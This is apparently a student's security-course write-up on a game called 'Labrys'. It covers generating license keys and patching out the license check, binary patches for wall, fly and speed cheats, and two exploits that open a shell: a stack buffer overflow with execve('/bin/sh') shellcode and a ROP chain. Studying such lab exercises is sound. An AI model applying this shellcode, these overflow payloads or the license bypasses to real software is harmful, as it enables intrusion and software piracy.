Game Labrys:
1) a) Decompilers and disassemblers give a very unreadable output. So, in order
to understand the license checking algorithm, I rewrote it in C
(license_check.c). Then, starting with "AAAAA-AAAAA-AAAAA-AAAAA-AAAAA", I could
check which conditions were blocking it to be valid and update it. My first
valid serial was "AAAAA-AAAAA-AAAAA-AMALA-ABBAX". This string must be written
into a file called "license.key" in the same directory the game is being will
run from.

b) After rewriting the check algorithm, it was not hard to see the patterns
valid keys should have. I made a simple algorithm that might generate at most
332186400 different keys. It could be easily upgraded to generate more, but I
thought that should be enough for this task. Only the first 10 significant
characters are changed and the script is not randomized: the list it outputs
always have the same serial keys. (I was not sure what "an arbitrary number of
valid serial numbers" meant, and I chose to implement this "arbitrary number" as
an input to the script).

Sample run:
$ ./keygen 10
This generates 10 different valid keys.

c) For this one, I changed the instruction at 0x405000 (call fopen) for another
(jmp 0x23a), which makes the program, instead of opening the license file, just
jumping to the part it says "Thanks for registering". (I used a online tool for
assembling the instruction https://defuse.ca/online-x86-assembler.htm). The
resulting binary is "labrysPatched.64"

------- 2 -------

2) a) The hacks were a bit more difficult, because the decompiler does a messy
job and the disassemblers are quite hard to give a try but here we go. For wall
collidings, I got a good result after several tries; On the address 0x414215,
there is an instruction 0x735c (jae 0x5e). I changed it to 0x7363 (jae 0x65).

This way, after checking "something", instead of returning 1, which probably
means collide=true, returns 0. The resulting binary is labrysWall.64

b) I really could not understand most of what was happening on "gravity"
method. Some random jumping modification made me jump so high and slow I would
"bump" on the sun/sky and then fall back to earth, another made me glitchy jump
in a way you could not fall back anymore and get stuck in a regular jump
height. Then (after trying speed hack), I got a really good result modifying
method save_state (I believe there the spells are checked, so I just had to
make "fly" spell to be activated all the time):

I changed the instruction at 0x41d4a5 - 0x7409 (je 0xb) to 0x7509 (jne 0xb).
This makes the fly spell condition verification inverse. So you are all the
time flying (except when you activate the spell fly, then you just get back to
normal). The resulting binary is labrysFly.64

c) This one was really similar to the last one: I changed the instruction at
0x41d4c8 - 0x7413 (je 0x15) to 0x7513 (jne 0x15). This makes the game to think
you are with the speed spell turned on aall the time, except when it is indeed.
The resulting binary is labrysSpeed.64

------- 3 -------

3) a) For this task, I used the 32-version of the game. My approach was based
on a tutorial I found on (https://dhavalkapil.com/blogs/Shellcode-Injection/).

The approach is basically the following: we want to create a buffer overflow so
that, after overwriting IP and RIP registers, shellcode is executed on the
stack. 

This could be achievable easily with ASLR (Address space layout
randomization): We could put the binary code that executes the shellcode on the
level file, add some crap to fill the space and, in the end, find the address
of the buffer storing it and append it to the level file.

Due to ASLR, the addresses are randomized every run, so we have a big range in
which our desired address could be. This way, our method would have a really
low probability of happening. The alternative would be to, if we had a lot of
space available, enlarge the malicious codewith a lot of (nop), so that the
total "lucky area" of our code to be jumped in is big enough for we to hope it
to happen.

Luckily, we have environment variables, which are kept on the stack and have
quite a big storage space.

The biggest code I could put there without breaking my bash session was
achieved this way (the code for the shell was taken from the slides):
    $ python -c 'print "\x90"*100000 + "\x31\xc0\x50\xeb\x0b\x8b\x1c\x24\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00"' > shellcode32.bin
    $ export SHELLCODE=$(cat shellcode32.bin)

The next thing I did was to get a good guess of the middle of the range my
target address could be:

I wrote a simple C code (envvar_finder.c) to print the address of an
environment variable, ran it a couple times and searched for something like the
average. I got "0xffc01da4"

python -c 'open("labyrinth", "w").write("0"*568 + "\xa4\x1d\xc0\xff")'

Then, after several tries (running and selecting level 5), It works! Not really
often, but does work! The resulting exploited level file is at "labyrinth":

    $ ./labrys.32
    Checking license AAAAA-AABAB-AAAAA-AMALA-ABBAX.
    Thanks for registering.
    Segmentation fault (core dumped)
    $ ./labrys.32
    Checking license AAAAA-AABAB-AAAAA-AMALA-ABBAX.
    Thanks for registering.
    Segmentation fault (core dumped)
    $ ./labrys.32
    Checking license AAAAA-AABAB-AAAAA-AMALA-ABBAX.
    Thanks for registering.
    $

b) This time, back to the 64-version. I explored a lot both of the gadget
finder tools mentioned on the task list. I tried to follow the tip on the
slides that said it was possible to finish it using that list of gadgets, but
most of the gadgets listed there were not found by the tools...

Then I tried to use the first tool (ROPGadget) with the option --ropchain, but
a weird error on the output suggested that either there were no
"write-what-where" primitives or the program was not staticly compiled. While
trying to understand what could be happening, I studied the other tool docs and
I could see there was actually an option for generating the rop chain to
execute shellcode! It did not work for the 32-version, but generate a pretty
rop chain for the 64-version. But it did not work.

Through gdb, I could debug it and see that the write gadget chosen by Ropper
was not a good choice :
0x00000000004089ea: mov qword ptr [rax], rdx; 
                    nop; 
                    leave; 
                    ret;

It has a "leave" instruction, which is "context-dependent" and messes up the
stack. Then, looking for something similar, I found another gadget:
0x0000000000406ed3: mov qword ptr [rax], rdx; 
                    nop; 
                    pop rbp; 
                    ret;

It also messes with the stack, but it is easy to just add some thrash to the
stack, so it is popped out of the stack into rbp.

Then it works nicely: As soon as you run ./labrys_rop.64 and select level 5, an
interactive shell opens. The script that generates the exploited level file is
at "ropchainer.py". The resulting exploited level file is at
"labyrinth_rop".
